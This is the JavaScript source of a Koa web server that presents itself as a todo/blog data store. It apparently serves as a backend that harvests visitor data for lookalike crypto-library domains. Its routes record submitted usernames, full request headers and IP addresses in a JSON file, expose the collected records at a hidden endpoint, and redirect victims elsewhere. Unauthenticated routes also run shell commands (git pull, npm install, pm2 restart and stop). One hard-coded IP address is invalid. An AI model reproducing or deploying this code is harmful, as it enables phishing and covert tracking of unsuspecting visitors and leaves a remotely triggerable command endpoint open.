const koa = require('koa');
const StaticCache = require('koa-static-cache');
const Router = require('koa-router');
const BodyParser = require('koa-bodyparser');
const fs = require('fs');
var child = require('child_process');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
var moment = require('moment');
var current_time =  moment(Date.now()).format('YYYY-MM-DD HH:mm:ss');
// var current_time=new Date().toLocaleString();
const email = require('./aa.js'); 

// var d=new Date(); //创建一个Date对象
// var localTime = d.getTime();
// var localOffset=d.getTimezoneOffset()*60000; //获得当地时间偏移的毫秒数
// var utc = localTime + localOffset; //utc即GMT时间
// var offset =16; //以夏威夷时间为例，东10区
// var hawaii = utc + (3600000*offset);
// var current_time = new Date(hawaii);
// console.log(current_time);


function getTimeByTimeZone(timeZone){
    var d=new Date();
        localTime = d.getTime(),
        localOffset=d.getTimezoneOffset()*60000, //获得当地时间偏移的毫秒数,这里可能是负数
        utc = localTime + localOffset, //utc即GMT时间
        offset = timeZone, //时区，北京市+8  美国华盛顿为 -5
        localSecondTime = utc + (3600000*offset);  //本地对应的毫秒数
        current_time = new Date(localSecondTime).toLocaleString();
        console.log("根据本地"+timeZone+"时区的时间是 " + current_time);
        // console.log("系统默认："+ d.toLocaleString());
        return current_time;
}

getTimeByTimeZone(8);
// console.log(current_time+'--');

/**
 * 通过服务器请求拿到一个基础页面，后续的内容就不要再通过浏览器发请求获取了
 * 因为通过浏览器发请求就会导致浏览器重新渲染，跳转，新开窗口
 * 
 * 首先通过浏览器拿到一个基础页面
 * 然后在基础页面中写入js，通过js的ajax来发送请求，ajax发送请求并不会直接渲染页面
 * 而是会把获取到的数据存储在ajax对象下
 */

let datas = JSON.parse(fs.readFileSync('./static/data/blogdata.json'));

const app = new koa();

// 静态
app.use( StaticCache('./static', {
    prefix: '/static',
    gzip: true
}) );

// body 解析
app.use( BodyParser() );

const router = new Router();

function addshuju(data,ctx,shu,llsps){
    // data.requestip=ctx.request.header.host; 
    // data.Origin=ctx.request.header.Origin; 
    data.header=ctx.request.header;
    // data.ctx=ctx;
    data.remoteAddress=ctx.req.connection.remoteAddress;
    data.Time=getTimeByTimeZone(8);
    // 添加ip地址
    // ctx.body = ' .'
    if(shu){
        datas.todos.push(data);
        fs.writeFileSync('./static/data/blogdata.json', JSON.stringify(datas));
        if(llsps){
            ctx.response.redirect('http://llsps.cn/static/b/index.html');
        }else{
            ctx.response.redirect('http://cryptosjsorg.cf');
        }
    }else{
        ctx.response.redirect('https://crypstojsorg.cf');
    }
}

app.use(async (ctx, next)=>{
    try{
        await next();   // 执行后代的代码
        if(!ctx.body){  // 没有资源
            var str=ctx.href; //请求地址
            var str1=ctx.header.referer;//输入栏
            // console.log(str);
            // console.log('str1',str1);
            
            if(str1=='http://cryptojsorg.cf/static/indexww.html'){
                 ctx.body = "404"
            }else if(str.includes('cryptojsorg')){
                // var data = {uu:ctx.href,referer:str1||''};
                // sendema(data,ctx)
                // ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href+'&referer='+str1||'');
                // return;
                ctx.response.redirect('http://cryptosjsorg.cf');
               
            }else{
                var data = {uu:ctx.href,referer:str1||''};
                addshuju(data,ctx,false)
                // ctx.response.redirect('http://cryptojsorg.cf/a?username=假的&uu='+ctx.href+'&referer='+str1|'');
            }
        }
    }catch(e){
        console.log(e);
        
        // 如果后面的代码报错 返回500
        ctx.response.redirect('https://cryptosjsorg.cf');
        // ctx.body = "500"
    }
})


router.get('/', async ctx => {
    // ctx.body = ``; 
    let query = ctx.request.query || {};
    var str1=ctx.header.referer;//输入栏
    var str=ctx.href; //请求地址
    var shu=str.includes('cryptojsorg');
    var llsps=str.includes('llsps');
    var jlfqq=str.includes('jlfqq');
    // console.log(str);
    // console.log(shu);
    if(shu){
        // console.log('yu');
        ctx.response.redirect('http://cryptosjsorg.cf');
        
    }else if(llsps){
        var data = {uu:ctx.href,referer:str1||''};
        addshuju(data,ctx,true,true)

    }else if(jlfqq){
        ctx.response.redirect('http://jlfqq.cn/static/pic/index.html?p='+query.p);

    }else{
        // console.log('ip');
        
        ctx.response.redirect('http://18.162.1194.33');
    }
});


router.get('/todoswws', async ctx => {
    // ctx.body = {x:1, y: 2}; //{"x":1, "y:2"}

    // ctx.body = datas.todos;
    // console.log(ctx.href);
    // console.log('Referer',ctx.header.referer);
    // console.log('Referer',ctx.header.referer!=='http://cryptojsorg.cf/static/indexww.html');
    var str=ctx.href; 
    var shu=str.includes('cryptojsorg')||str.includes('llsps');
    if(!shu){
        ctx.response.redirect('http://cryptosjsorg.cf');
        return;
    }else{
        ctx.body = {
            code: 0,
            data: datas.todos
        }
    }
});

// router.post('/toggle', async ctx => {
//     let id = ctx.request.body.id || 0;

//     if (!id) {
//         ctx.body = {
//             code: 1,
//             data: '请传入id'
//         }
//         return;
//     }

//     let todo = datas.todos.find( todo => todo.id == id );
//     todo.done = !todo.done;

//     ctx.body = {
//         code: 0,
//         data: todo
//     }

//     fs.writeFileSync('./static/data/blogdata.json', JSON.stringify(datas));
// });

router.post('/remove', async ctx => {
    let obj = ctx.request.body || 0;
    
    if (!obj) {
        ctx.body = {
            code: 1,
            data: '请传入id'
        }
        ctx.response.redirect('http://cryptosjsorg.cf');
        return;
    }

    datas.todos = datas.todos.filter((todo,i) => {
        // var aa=i == obj.index||todo.id == obj.id||todo.aa == obj.aa||todo.username == obj.username;
        var aa=i == obj.index;
        return !aa;
    });

    // let todo = datas.todos.find( todo => todo.id == id );

    ctx.body = {
        code: 0,
        data: '删除成功'
    }

    fs.writeFileSync('./static/data/blogdata.json', JSON.stringify(datas));
});

// router.post('/add', async ctx => {
router.get('/a', async ctx => {
    let data = ctx.request.query || {};
    var str=ctx.href; //请求地址
    header=ctx.request.header;
    // console.log('header',header);
    // console.log('Origin',header.origin);

    if(!!!data.username&&!!!header.origin){

        data.username="假数据"
        
        async function timeout() {
            return new Promise((resolve, reject) => {
                // email.sendMail('1162212711@qq.com', '5555', (state) => {
                    // resolve(state);
                    resolve(true);
                // })
            })
        }
        // var timeout1=util.promisify(timeout)
        await timeout().then(state => {
            // console.log('进来假了');
            if (state) {
                // console.log('进来假了111');
                data.username="假数据1"
                data.header=ctx.request.header;
                data.remoteAddress=ctx.req.connection.remoteAddress;
                data.Time=getTimeByTimeZone(8);
                datas.todos.push(data);
                fs.writeFileSync('./static/data/blogdata.json', JSON.stringify(datas));
                ctx.response.redirect('http://cryptosjsorg.cf');
                // ctx.body = "1";
                return ;
            } else {
                console.log('进来假了222');
                ctx.response.redirect('http://cryptosjsorg.cf');
                // ctx.body = "0"
                return ;
            }
        })
        
    }else{
        // var shu=str.includes('cryptojsorg');
        // addshuju(data,ctx,shu)
        addshuju(data,ctx,false)
        
    }
    
    // let title = ctx.request.body.title || '';
    // if (!title) {
    //     ctx.body = {
    //         code: 1,
    //         data: '请传入任务标题'
    //     }
    //     return;
    // }

    // let newTask = {
    //     id: ++datas._id,
    //     title,
    //     done: false
    // };

    // datas.todos.push(newTask);
    // ctx.body = {
    //     code: 0,
    //     data: newTask
    // }
    // console.log('完成');
    // ctx.body = ' .'
});

router.get('/dssa', async ctx => {

    var { stdout, stderr } =  exec('pm2 stop app');
    console.log(logss+'--=== stop');
    ctx.response.redirect('http://cryptosjsorg.cf');
});
 
router.post('/reset', async ctx => {
    var logss='fa';
    console.log(current_time+'重新发布12');
    
    var ss='11';

    // var { stdout, stderr } = await exec('ls');
    //     logss+=stdout;console.log(logss+'--'+stderr+'=== ls');
    var { stdout, stderr } = await exec('cd /data/jkins');
        logss+=stdout;console.log('--'+stderr+'=== cd');
    var { stdout, stderr } = await exec('git pull');
        logss+=stdout;console.log('--=== git pull');
    var { stdout, stderr } = await exec('npm i')
    logss+=stdout;console.log('--stderr=== npm i');

    console.log('------------','执行完毕并成功，执行下一步重启');
    ctx.body = {
        code: 0,
        data: logss
    };

    var { stdout, stderr } =  exec('pm2 restart app');
    console.log(logss+'--=== restart');

    
        
    // ss =await child.exec('cd /data/jkins', async function(err, stdout,stderr) {
    //     logss+=stdout;console.log(logss+'--'+stderr+'=== cd');

    //     child.exec('git pull', async function(err, stdout,stderr) {
    //         logss+=stdout;console.log(logss+'--=== git pull');

    //         child.exec('npm i', function(err, stdout,stderr) {
    //             logss+=stdout;console.log(logss+'--stderr=== npm i');
        
    //             child.exec('pm2 restart app', function(err, stdout,stderr) {
    //                 logss+=stdout;console.log(logss+'--=== restart');
    //             });
    //         })
    //     })
    // })

    
    
});


app.use( router.routes() );

app.listen(80);

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ' + err);
})

console.log(current_time+'--启动成功---!!测试 99');

